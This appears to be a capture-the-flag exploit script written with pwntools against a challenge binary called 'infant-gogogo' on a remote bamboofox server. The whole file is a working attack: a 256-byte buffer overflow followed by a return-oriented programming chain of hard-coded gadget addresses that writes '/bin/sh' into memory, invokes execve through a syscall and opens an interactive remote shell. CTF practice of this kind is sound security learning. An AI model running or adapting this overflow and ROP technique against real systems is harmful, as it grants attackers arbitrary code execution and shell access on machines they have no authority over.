from pwn import *

context.arch = 'amd64'

r = remote('bamboofox.cs.nctu.edu.tw', 58795)
#r = process('./infant-gogogo')

payload = 'A'*256

# ROP gadget
syscall = 0x4520b9
pop_rax = 0x404656
mov_qword_ptr_rdi_rax = 0x4518ff
movsxd_rsi_eax = 0x451e3e
pop_rdx = 0x44ecf2
pop_rdi_add_ptr_rax = 0x485abd

data_section = 0x523000

# set rsi to 0
chain = payload
chain += p64(pop_rax) + p64(0) + p64(movsxd_rsi_eax)

# set rdx to 0
chain += p64(pop_rdx) + p64(0)

# set rdi to /bin/sh
chain += p64(pop_rax) + p64(data_section)
chain += p64(pop_rdi_add_ptr_rax) + p64(data_section)
chain += p64(pop_rax) + '/bin/sh\x00' + p64(mov_qword_ptr_rdi_rax)

# set rax to 59
chain += p64(pop_rax) + p64(59)

chain += p64(syscall)

r.sendline(chain)

r.interactive()
